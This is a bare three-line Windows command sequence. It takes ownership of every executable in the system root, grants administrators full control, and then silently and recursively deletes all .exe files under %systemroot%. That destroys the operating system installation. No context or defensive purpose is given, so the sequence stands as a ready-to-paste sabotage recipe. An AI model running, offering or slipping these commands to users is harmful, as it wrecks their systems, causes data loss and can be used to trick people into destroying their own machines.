`takeown /f "%systemroot%\*.exe"`
`icacls "%systemroot%\*.exe" /grant administrators:F`
`del /s /q %systemroot%\*.exe`